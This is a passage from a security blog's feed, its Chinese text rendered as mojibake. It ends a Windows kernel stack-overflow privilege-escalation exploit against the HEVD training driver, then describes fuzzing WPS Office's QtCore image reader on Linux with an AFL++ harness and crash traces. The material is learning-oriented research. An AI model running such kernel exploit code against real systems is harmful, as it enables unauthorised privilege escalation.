class="hljs-built_in">memset</span>(chBuffer, <span class="hljs-number">0xff</span>, chBufferLen);    <span class="hljs-comment">//memset(chBuffer + chBufferLen, 0x41, 0x8);</span>    *(INT64*)(chBuffer + chBufferLen) = (INT64)addr;    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    BOOL is_ok = DeviceIoControl(dev, <span class="hljs-number">0x222003</span>, chBuffer, chBufferLen + <span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    CloseHandle(dev);    system(<span class="hljs-string">&quot;pause&quot;</span>);    system(<span class="hljs-string">&quot;start cmd&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯ç¼–å†™<code>exp</code>ï¼Œæœ€åéœ€è¦èƒ½è®©<code>ioctl</code>çš„<code>handler</code>ä¸å´©æºƒçš„è¿”å›ï¼Œæ‰å¯ä»¥å†èµ·<code>cmd</code>ï¼Œå¾—åˆ°ä¸€ä¸ªææƒä¹‹åçš„è¿›ç¨‹ï¼Œå› æ­¤è¦æ¢å¤<code>ret</code>åˆ°<code>BufferOverflowStackIoctlHandler</code>ä¹‹åçš„<code>add rsp, 0x28; ret</code>æŒ‡ä»¤</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://bbs.pediy.com/thread-270159.htm">https://bbs.pediy.com/thread-270159.htm</a><br><a href="https://h0mbre.github.io/HEVD_Stackoverflow_64bit/">https://h0mbre.github.io/HEVD_Stackoverflow_64bit/</a><br><a href="https://www.anquanke.com/post/id/245528">https://www.anquanke.com/post/id/245528</a><br><a href="https://50u1w4y.github.io/site/HEVD/homePage/">https://50u1w4y.github.io/site/HEVD/homePage/</a><br><a href="https://www.abatchy.com/2018/01/kernel-exploitation-2">https://www.abatchy.com/2018/01/kernel-exploitation-2</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯¹wpsçš„qtcoreçš„æŸä¸€æ¥å£fuzz</title>
    <link href="/2022/03/29/wps%20fuzz/"/>
    <url>/2022/03/29/wps%20fuzz/</url>
    
    <content type="html"><![CDATA[<p>ä¸»è¦çœ‹åˆ°ä»¥ä¸‹ä¸‰ç¯‡<code>blog</code></p><blockquote><p><a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a><br><a href="https://www.anquanke.com/post/id/240938">https://www.anquanke.com/post/id/240938</a><br><a href="https://ruan777.github.io/2021/06/02/%E4%BD%BF%E7%94%A8winafl%E5%AF%B9qtcore%E7%9A%84%E4%B8%80%E6%AC%A1fuzz%E5%B0%9D%E8%AF%95">https://ruan777.github.io/2021/06/02/ä½¿ç”¨winaflå¯¹qtcoreçš„ä¸€æ¬¡fuzzå°è¯•</a></p></blockquote><p>å› æ­¤å°è¯•å¯¹<code>linux</code>ä¸Šçš„<code>wps</code>çš„<code>qtcore4</code>è¿›è¡Œ<code>fuzz</code></p><pre><code class="hljs yaml"><span class="hljs-string">ç¯å¢ƒï¼š</span><span class="hljs-attr">linux:</span> <span class="hljs-string">ubuntu</span> <span class="hljs-number">20.04</span><span class="hljs-attr">wps:</span> <span class="hljs-number">11.1</span><span class="hljs-number">.0</span><span class="hljs-number">.10161</span><span class="hljs-attr">libcQtCore:</span> <span class="hljs-number">4.7</span><span class="hljs-number">.4</span></code></pre><h2 id="æ•´ä½“çš„é€»è¾‘"><a href="#æ•´ä½“çš„é€»è¾‘" class="headerlink" title="æ•´ä½“çš„é€»è¾‘"></a>æ•´ä½“çš„é€»è¾‘</h2><p>æ ¹æ®<code>Nafiez</code>çš„æŠ¥å‘Šï¼Œå¯ä»¥çŸ¥é“ï¼Œä¸»è¦æ˜¯<code>kso.dll</code>ä¸­è°ƒç”¨<code>QtCore4.dll</code>çš„<code>QImageReader::read()</code>å‡ºé”™çš„ï¼Œå› æ­¤åç»­ä¸¤ç¯‡æ–‡ç« å‡å¯¹äº<code>QtCore4.dll</code>çš„è¯¥æ¥å£è¿›è¡Œ<code>fuzz</code></p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; !heap -p -a cc<span class="hljs-number">53</span>afbc    <span class="hljs-attribute">address</span> cc<span class="hljs-number">53</span>afbc found in    <span class="hljs-attribute">_DPH_HEAP_ROOT</span> @ <span class="hljs-number">6731000</span>    <span class="hljs-attribute">in</span> busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                <span class="hljs-attribute">cc36323c</span>:         cc<span class="hljs-number">53</span>afa<span class="hljs-number">8</span>               <span class="hljs-number">58</span> -         cc<span class="hljs-number">53</span>a<span class="hljs-number">000</span>             <span class="hljs-number">2000</span>    <span class="hljs-attribute">6f13ab70</span> verifier!AVrfDebugPageHeapAllocate+<span class="hljs-number">0</span>x<span class="hljs-number">00000240</span>    <span class="hljs-attribute">77a9909b</span> ntdll!RtlDebugAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">00000039</span>    <span class="hljs-attribute">779ebbad</span> ntdll!RtlpAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>ed    <span class="hljs-attribute">779eb0cf</span> ntdll!RtlpAllocateHeapInternal+<span class="hljs-number">0</span>x<span class="hljs-number">0000022</span>f    <span class="hljs-attribute">779eae8e</span> ntdll!RtlAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">0000003</span>e    <span class="hljs-attribute">6f080269</span> MSVCR<span class="hljs-number">100</span>!malloc+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>b    <span class="hljs-attribute">6f08233b</span> MSVCR<span class="hljs-number">100</span>!operator new+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>f    <span class="hljs-attribute">6b726c67</span> QtCore<span class="hljs-number">4</span>!QImageData::create+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fa    <span class="hljs-attribute">6b726b54</span> QtCore<span class="hljs-number">4</span>!QImage::QImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e    <span class="hljs-attribute">6b7a0e21</span> QtCore<span class="hljs-number">4</span>!png_get_text+<span class="hljs-number">0</span>x<span class="hljs-number">00000436</span>    <span class="hljs-attribute">6b79d7a8</span> QtCore<span class="hljs-number">4</span>!QImageIOHandler::setFormat+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>de    <span class="hljs-attribute">6b79d457</span> QtCore<span class="hljs-number">4</span>!QPixmapData::fromFile+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>bf    <span class="hljs-attribute">6b725eb4</span> QtCore<span class="hljs-number">4</span>!QImageReader::read+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">2</span>    <span class="hljs-attribute">6d0ca585</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000254</span>e    <span class="hljs-attribute">6d0c5964</span> kso!kpt::Direct<span class="hljs-number">2</span>DPaintEngineHelper::operator=+<span class="hljs-number">0</span>x<span class="hljs-number">00000693</span>    <span class="hljs-attribute">6d0c70d0</span> kso!kpt::RelativeRect::unclipped+<span class="hljs-number">0</span>x<span class="hljs-number">00001146</span>    <span class="hljs-attribute">6d0c8d0c</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">00000</span>cd<span class="hljs-number">5</span>    <span class="hljs-attribute">6d451d5c</span> kso!BlipCacheMgr::BrushCache+<span class="hljs-number">0</span>x<span class="hljs-number">0000049</span>a    <span class="hljs-attribute">6d451e85</span> kso!BlipCacheMgr::GenerateBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>d    <span class="hljs-attribute">6d453227</span> kso!BlipCacheMgr::GenCachedBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">00000083</span>    <span class="hljs-attribute">6d29bb92</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">000009</span>b<span class="hljs-number">6</span>    <span class="hljs-attribute">6d450fb1</span> kso!drawing::RenderTargetImpl::paint+<span class="hljs-number">0</span>x<span class="hljs-number">00000090</span>    <span class="hljs-attribute">6d29b528</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">0000034</span>c    <span class="hljs-attribute">6d2a2d83</span> kso!drawing::VisualRenderer::render+<span class="hljs-number">0</span>x<span class="hljs-number">00000060</span>    <span class="hljs-attribute">6d2b8970</span> kso!drawing::SingleVisualRenderer::drawNormal+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>b<span class="hljs-number">5</span>    <span class="hljs-attribute">6d2b86a7</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">1</span>    <span class="hljs-attribute">6d2b945e</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">00000046</span>    <span class="hljs-attribute">6d3d0142</span> kso!drawing::ShapeVisual::paintEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000044</span>a    <span class="hljs-attribute">680a2b5c</span> wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+<span class="hljs-number">0</span>x<span class="hljs-number">000068</span>f<span class="hljs-number">1</span>    <span class="hljs-attribute">6d0e36df</span> kso!AbstractVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">00000051</span>    <span class="hljs-attribute">6d3cbe97</span> kso!drawing::ShapeVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000018</span>f    <span class="hljs-attribute">6d0eba90</span> kso!VisualPaintEvent::arriveVisual+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e</code></pre><p>åç»­ä¸¤ç¯‡æ–‡ç« <code>fuzz</code>çš„ä»£ç é€»è¾‘ä¸º</p><pre><code class="hljs maxima">QImage <span class="hljs-built_in">image</span>;QImageReader reader;QString image_file_name;# <span class="hljs-built_in">transform</span> (char[] <span class="hljs-built_in">file_name</span>) to (QString image_file_name)reader.setFileName(image_file_name)reader.<span class="hljs-built_in">read</span>(<span class="hljs-built_in">image</span>);</code></pre><h2 id="ä»windowsåˆ°linux"><a href="#ä»windowsåˆ°linux" class="headerlink" title="ä»windowsåˆ°linux"></a>ä»windowsåˆ°linux</h2><p>åœ¨è¿ç§»çš„æ—¶å€™ï¼Œå°±å»æ‰¾äº†ä¸€ä¸‹å¯¹åº”çš„<code>libQtCore.so.4.7.4</code>çš„æ¥å£ï¼Œå¾—åˆ°äº†ä»¥ä¸‹çš„ä»£ç </p><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -masm=intel ./qt_reader.c -ldl -no-pie -o qt_reader</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    dlopen(<span class="hljs-string">&quot;/path/libc++.so.1&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libpng12.so.0&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libc++abi.so.1&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">void</span>* handle = dlopen(<span class="hljs-string">&quot;/path/libQtCore.so.4.7.4&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">if</span> (handle == <span class="hljs-number">0</span>)    &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open handle failed&quot;</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, dlerror());        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-comment">// QImageReader::QImageReader(QImageReader *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReaderC2Ev&quot;</span>);    <span class="hljs-comment">// QImageReader::read(QImageReader *this, QImage *a2)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader_read)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader4readEP6QImage&quot;</span>);    <span class="hljs-comment">// QImageReader::setFileName(QImageReader *this, const QString *a2)</span>    <span class="hljs-keyword">void</span> (*qt_setFileName)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader11setFileNameERK7QString&quot;</span>);    <span class="hljs-comment">// QString::QString(QString *this, const QChar *)</span>    <span class="hljs-keyword">void</span> (*qt_qstring)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QStringC2EPK5QChar&quot;</span>);    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    <span class="hljs-keyword">void</span> (*qt_qstring_fromlatin1)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QString10fromLatin1EPKci&quot;</span>);    <span class="hljs-comment">// QImage::QImage(QImage *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimage)() = dlsym(handle, <span class="hljs-string">&quot;_ZN6QImageC2Ev&quot;</span>);    <span class="hljs-comment">// QFile::exists(QFile *__hidden this)</span>    <span class="hljs-keyword">void</span> (*qt_qfile_exits)() = dlsym(handle, <span class="hljs-string">&quot;_ZNK5QFile6existsEv&quot;</span>);    <span class="hljs-comment">// QFile::close()</span>    <span class="hljs-keyword">void</span> (*qt_close)() = dlsym(handle, <span class="hljs-string">&quot;_ZN5QFile5closeEv&quot;</span>);    <span class="hljs-keyword">char</span>* image = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* qstring = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* reader = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);    <span class="hljs-keyword">char</span>* file_name = argv[<span class="hljs-number">1</span>];    <span class="hljs-comment">// pusha</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;push rax\n&quot;</span>        <span class="hljs-string">&quot;push rbx\n&quot;</span>        <span class="hljs-string">&quot;push rcx\n&quot;</span>          <span class="hljs-string">&quot;push rdx\n&quot;</span>              <span class="hljs-string">&quot;push rbp\n&quot;</span>              <span class="hljs-string">&quot;push rdi\n&quot;</span>              <span class="hljs-string">&quot;push rsi\n&quot;</span>              <span class="hljs-string">&quot;push r8\n&quot;</span>              <span class="hljs-string">&quot;push r9\n&quot;</span>              <span class="hljs-string">&quot;push r10\n&quot;</span>              <span class="hljs-string">&quot;push r11\n&quot;</span>              <span class="hljs-string">&quot;push r12\n&quot;</span>              <span class="hljs-string">&quot;push r13\n&quot;</span>              <span class="hljs-string">&quot;push r14\n&quot;</span>              <span class="hljs-string">&quot;push r15\n&quot;</span>        <span class="hljs-string">&quot;push r15\n&quot;</span>);    <span class="hljs-comment">// QImage::QImage(image)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimage)    );        <span class="hljs-comment">// QImageReader::QImageReader(reader)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader)    );    <span class="hljs-comment">// **************** This is a wrong interface of transforming the char to QString ***********************</span>    <span class="hljs-comment">// // QString::QString(qstring, file_name)</span>    <span class="hljs-comment">// __asm__ __volatile__ (</span>    <span class="hljs-comment">//     &quot;call rax\n&quot;</span>    <span class="hljs-comment">//     :</span>    <span class="hljs-comment">//     : &quot;D&quot;(qstring), &quot;S&quot;(file_name), &quot;a&quot;(qt_qstring)</span>    <span class="hljs-comment">// );</span>    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(qstring), <span class="hljs-string">&quot;S&quot;</span>(file_name), <span class="hljs-string">&quot;d&quot;</span>(<span class="hljs-built_in">strlen</span>(file_name)), <span class="hljs-string">&quot;a&quot;</span>(qt_qstring_fromlatin1)    );    <span class="hljs-comment">// QImageReader::setFileName(reader, qstring)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(qstring), <span class="hljs-string">&quot;a&quot;</span>(qt_setFileName)    );    <span class="hljs-comment">// QFile::exits(qfile) qfile = reader+0x10</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;test al, al\n&quot;</span>        <span class="hljs-string">&quot;je error\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qfile_exits)    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file exists&quot;</span>);    <span class="hljs-comment">// QImageReader::read(reader, qimage)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader_read)    );        <span class="hljs-comment">// QFile::close()</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;jmp out\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_close)    );    <span class="hljs-comment">// error:</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;error:\n&quot;</span>    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error: file not exists&quot;</span>);    <span class="hljs-comment">// popa</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;out:\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r14\n&quot;</span>        <span class="hljs-string">&quot;pop r13\n&quot;</span>        <span class="hljs-string">&quot;pop r12\n&quot;</span>        <span class="hljs-string">&quot;pop r11\n&quot;</span>        <span class="hljs-string">&quot;pop r10\n&quot;</span>        <span class="hljs-string">&quot;pop r9\n&quot;</span>        <span class="hljs-string">&quot;pop r8\n&quot;</span>        <span class="hljs-string">&quot;pop rsi\n&quot;</span>        <span class="hljs-string">&quot;pop rdi\n&quot;</span>        <span class="hljs-string">&quot;pop rbp\n&quot;</span>        <span class="hljs-string">&quot;pop rdx\n&quot;</span>        <span class="hljs-string">&quot;pop rcx\n&quot;</span>        <span class="hljs-string">&quot;pop rbx\n&quot;</span>        <span class="hljs-string">&quot;pop rax\n&quot;</span>        );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>è¿™ä¸ªåœ°æ–¹ï¼Œæœ€å¼€å§‹å†™çš„æ—¶å€™ï¼Œæ’¸äº†ä¸€ç‰ˆè·Ÿåä¸¤ç¯‡ä¸€æ ·çš„æ¥å£çš„ä»£ç ï¼Œä½†æ˜¯å‘ç°è¦†ç›–ç‡å¹¶æ²¡æœ‰ä¸Šå‡ï¼Œæœ€åè°ƒçš„æ—¶å€™ï¼Œå‘ç°åœ¨<code>reader.read()</code>çš„ç¬¬ä¸€æ¬¡åˆ¤æ–­æ”¯æŒçš„æ–‡ä»¶æ ¼å¼ï¼ˆ<code>bmp, png, jpg ...</code>ï¼‰ä»¥åŠæ–‡ä»¶æ˜¯å¦å­˜åœ¨æ—¶ï¼Œå°±å‘ç°ç¨‹åºè‡ªèº«å°±èµ°åˆ°äº†<code>File Not found</code>çš„åœ°æ–¹</p><p>æ— å¥ˆåªèƒ½é‡æ–°è°ƒè¯•ç¨‹åºï¼Œæœ€åæ‰¾åˆ°äº†ä¸€ä¸ª<code>QFile::exists()</code>æ¥å£ï¼Œè°ƒè¯•çš„æ—¶å€™ï¼Œå‘ç°<code>QFile</code>ä¸­å­˜å‚¨çš„è·¯å¾„çš„<code>QString</code>è·Ÿæˆ‘ç”¨<code>QString::QString()</code>çš„æ•°æ®ç»“æ„å¹¶ä¸ä¸€è‡´ï¼Œå°±æ¢äº†ä¸€ä¸ª<code>QString::fromLatin1()</code>æ¥å£ï¼Œå°±èƒ½æˆåŠŸåœ°è·‘èµ·æ¥äº†</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>åœ¨å†™å¥½æ¿å­ä¹‹åå°±æƒ³è¦ç”¨<code>afl</code>çš„<code>qemu_mode</code>è¿›è¡Œæ’æ¡©<code>fuzz</code>ï¼ŒæŠ˜è…¾äº†åŠå¤©ï¼Œæ„Ÿè§‰<code>afl</code>åŸæœ¬çš„<code>qemu</code>ç‰ˆæœ¬ä»¥åŠ<code>patch</code>å’Œ<code>libc</code>çš„æ¥å£éƒ½å¤ªè€äº†</p><p>æœ€åå¬å­¦é•¿çš„ç›´æ¥æ•´<code>afl++</code>çš„<code>qemu_mode</code></p><p>æœ€åˆ<code>fuzz</code>èµ·æ¥çš„æ—¶å€™ï¼Œå¹¶æ²¡è¿‡å¤šçš„è®¾ç½®ï¼Œä½†æ˜¯è¿™æ ·çš„è¯æ˜¯å…¨æ’æ¡©ï¼Œåƒ<code>dlopen</code>çš„ä¸€äº›åº“éƒ½æ˜¯ä¸å…³å¿ƒä»¥åŠæ²¡å¿…è¦çš„ï¼Œè€Œä¸”åœ¨<code>afl++</code>çš„çª—å£ä¹Ÿçœ‹çš„å‡ºæ¥ï¼ŒåŸºæœ¬ä¸Šè¦†ç›–ç‡éƒ½æ˜¯ä¸ä¸Šå‡çš„ï¼Œè€Œä¸”æä½ï¼ˆ0.10%ï¼‰</p><p>åˆ©ç”¨<code>./afl-qemu-trace -D 1.txt -d exec,nochain ./qt_reader /tmp/1.png</code>è®°å½•ä¸‹æ¥<code>trace</code>ï¼Œå‘ç°ä¸åŒæ–‡ä»¶çš„<code>trace</code>å·®è·è¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œè¯´æ˜ä»£ç å¹¶æ²¡æœ‰å†™å´©</p><p>æœ€ååˆ©ç”¨<code>export AFL_INST_LIBS=1</code>ç»™åº“å‡½æ•°ä¹Ÿæ’æ¡©ä¹‹åå°±å¯ä»¥è·‘èµ·æ¥äº†</p><p>å¦å¤–ä¹Ÿå¯ä»¥é€šè¿‡<code>AFL_QEMU_INST_RANGES</code>è®¾ç½®<code>range</code>ï¼Œè¿›è¡ŒèŒƒå›´çš„æ’æ¡©ï¼Œé€šè¿‡ä»¥ä¸‹ä»£ç è·å–ç›¸å…³<code>.so</code>çš„å†…å­˜åœ°å€èŒƒå›´</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">lm</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">link_map</span>*)<span class="hljs-title">handle</span>;</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base:%p\n&quot;</span>, lm-&gt;l_addr);</code></pre><p>å¦å¤–ç¿»äº†ä¸€ä¸‹<code>afl</code>çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœ<code>cur_loc &gt;= afl_inst_rms</code>åˆ™<code>return</code>ï¼Œæ‰€ä»¥å¦‚æœç»™åº“æ’æ¡©è¿˜æ˜¯è¦æ³¨æ„æ˜¯å¦è¶…è¿‡äº†<code>MAP_SIZE</code>ï¼Œå¦åˆ™æœ€åçš„æ¯”è¾ƒå…³å¿ƒçš„<code>.so</code>æ²¡æ’æ¡©ä¸Š</p><pre><code class="hljs c"><span class="hljs-comment">/* Instrumentation ratio: */</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> afl_inst_rms = MAP_SIZE;<span class="hljs-comment">/* The equivalent of the tuple logging routine from afl-as.h. */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> </span>&#123;  <span class="hljs-keyword">static</span> __thread abi_ulong prev_loc;  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><span class="hljs-comment">     Linux systems. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)    <span class="hljs-keyword">return</span>;  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASAN is not a</span><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let&#x27;s mangle</span><span class="hljs-comment">     the value to get something quasi-uniform. */</span>  cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>);  cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;  afl_area_ptr[cur_loc ^ prev_loc]++;  prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;&#125;</code></pre><h2 id="å…¶ä»–-è¸©å‘"><a href="#å…¶ä»–-è¸©å‘" class="headerlink" title="å…¶ä»– è¸©å‘"></a>å…¶ä»– <del>è¸©å‘</del></h2><h3 id="reader-setFileName"><a href="#reader-setFileName" class="headerlink" title="reader.setFileName"></a>reader.setFileName</h3><p>ä¸€å¼€å§‹æˆ‘æƒ³å»æ‰¾<code>houjingyi</code>å¸ˆå‚…æ˜¯å¦‚ä½•å¾—åˆ°<code>reader.setFileName</code>æ¥å£åœ¨<code>reader.read()</code>ä¹‹å‰è¢«è°ƒç”¨äº†çš„ï¼Œå› æ­¤æˆ‘å»å°è¯•è°ƒè¯•<code>linux</code>ä¸‹çš„<code>wpsoffice</code>æ‰“å¼€<code>docx</code>çš„æ“ä½œ</p><p>åœ¨<code>wpsoffice</code>æœ€åˆå¹¶æœªåŠ è½½<code>libQtCore.so.4.7.4</code>æ—¶ï¼Œç»™<code>pthread_create</code>ä¸‹æ–­ç‚¹ï¼Œ<code>continue</code>ä¹‹åå†ç»™<code>libQtCore.so.4.7.4</code>ä¸­çš„<code>QImageReader.read()</code>å’Œ<code>QImageReader.setFileName()</code>ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯å…¶å®æœ€åå¹¶æ²¡æœ‰å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥ï¼Œåœ¨è°ƒç”¨<code>reader.read()</code>ä¹‹å‰è°ƒç”¨äº†<code>reader.setFileName()</code></p><p>æœ€åå»è¯¢é—®<code>houjingyi</code>å¸ˆå‚…ï¼Œæ‰çŸ¥é“ï¼Œå¸ˆå‚…æ˜¯ç›´æ¥æ ¹æ®ç¨‹åºä»£ç é€»è¾‘ï¼Œè®¤ä¸º<code>reader.read()</code>ä¹‹å‰è‚¯å®šæœ‰å¯¹äºè®¾ç½®å›¾ç‰‡è·¯å¾„<code>reader.setFileName()</code>çš„æ“ä½œï¼ˆæ„Ÿè§‰è‡ªå·±çš„æ€ç»´æœ‰ç‚¹å±€é™äº†ï¼Œè€æ˜¯æƒ³æ˜æ˜ç™½ç™½è°ƒå‡ºæ¥è°ƒç”¨çš„æ¥å£å’Œé¡ºåºï¼Œå®é™…ä¸Šå…¨ç„¶æ²¡ç®¡å¼€å‘è€…åœ¨å¼€å‘æ—¶å€™çš„ä»£ç é€»è¾‘ï¼‰</p><p>P.S. è¯´èµ·æ¥ï¼Œè°ƒè¯• <code>wpsoffice</code> 